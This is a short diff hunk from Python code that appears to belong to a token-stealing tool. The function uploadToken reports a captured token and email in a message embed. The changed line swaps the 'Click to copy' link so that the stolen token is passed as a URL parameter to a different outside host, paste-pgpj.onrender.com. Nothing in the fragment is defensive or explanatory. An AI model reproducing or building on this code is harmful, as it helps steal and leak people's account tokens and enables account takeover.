@@ -287,7 +287,7 @@ def uploadToken(token, path):
             "fields": [
                 {
                     "name": ":rocket: Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "value": f"`{token}`\n[Click to copy](https://paste-pgpj.onrender.com/?p={token})"
                 },
                 {
                     "name": ":envelope: Email:",
